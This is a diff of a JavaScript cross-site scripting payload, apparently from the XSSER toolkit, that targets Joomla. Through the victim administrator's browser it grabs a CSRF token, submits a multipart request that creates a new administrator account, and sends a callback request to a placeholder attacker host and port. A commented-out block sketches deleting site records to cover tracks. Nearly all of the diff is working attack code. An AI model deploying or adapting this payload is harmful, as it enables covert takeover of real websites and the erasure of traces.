@@ -1,10 +1,28 @@
-// Original authors: Gökmen Güreçi & Muhammet Dilmaç 
-// Modified by Hans-Michael Varbaek for the XSSER 2.5
-//
-// For ethical and legal purposes only. This script is provided as is and without warranty.
+/*
+Title: Joomla Core Payload (New Admin User)
+Author: Hans-Michael Varbaek
+Company: VarBITS
 
-var request = new XMLHttpRequest();
-var req = new XMLHttpRequest();
+Version: 2.75
+
+Changelog:
+- Ver 2.75 : A few minor improvements.
+- Ver 2.5  : First release.
+
+Special Credits: Gökmen Güreçi, Muhammet Dilmaç and Sense of Security (Version 2.5)
+
+For ethical and legal purposes only. This script is provided as is and without warranty.
+
+TODO:
+- For pre-existing forms, consider using FormData to read and update/set new values in the future:
+https://developer.mozilla.org/en-US/docs/Web/API/FormData/Using_FormData_Objects
+https://developer.mozilla.org/en-US/docs/Web/API/FormData
+https://developer.mozilla.org/en-US/docs/Web/API/FormData/set
+-- Update this payload, or add a new payload that uses FormData() and XMLHttpRequest()
+*/
+
+var request = new XMLHttpRequest(); // Initial request to get CSRF token
+var req = new XMLHttpRequest(); // Subsequent request to inject new user
 var id = '';
 var boundary = Math.random().toString().substr(2);
 var space = "-----------------------------";
@@ -84,21 +102,31 @@ request.onload = function() {
             "\r\nContent-Disposition: form-data; name=\"" + id + "\"" +
             "\r\n\r\n1\r\n" +
             space + boundary + "--\r\n";
-        req.onload = function() {
-            if (req.status >= 200 && req.status < 400) {
-                var resp = req.responseText;
-                console.log(resp);
-            }
-        };
         req.send(multipart);
     }
 };
 
 request.send();
 
-   // NEW FEATURE (Callback Notification)
-   var request2 = new XMLHttpRequest(); // Initiate XMLHttpRequest
-   request2.open("GET", "http://CALLBACKHOST:CALLBACKPORT/js_shell_notify.txt"); // Method and URL to send the request to - Hostname and port are set by xsser.py
-   request2.send(); // Send the request
+// Callback Notification
+var request2 = new XMLHttpRequest(); // Initiate XMLHttpRequest
+request2.open("GET", "http://CALLBACKHOST:CALLBACKPORT/js_shell_notify.txt");
+// Method and URL to send the request to - Hostname and port are set by: xsser.py
+request2.send(); // Send the request
 
-//Joomla.checkAll(this); // For auto self-clean up later
+// TODO: Fix this in a later version
+// Confirmed working manually in Chrome. For some reason, it does not work when executed as a script.
+/*
+Maybe we need to introduce a delay?
+Maybe we have to specify top.document?
+
+    setTimeout(function() {
+        clean_up();
+    }, 2000);
+
+checkboxes = document.getElementsByName('cid[]');
+for(var i=0, n=checkboxes.length;i<n;i++) {
+    checkboxes[i].checked = true;
+}
+Joomla.submitbutton('delete_all');
+*/
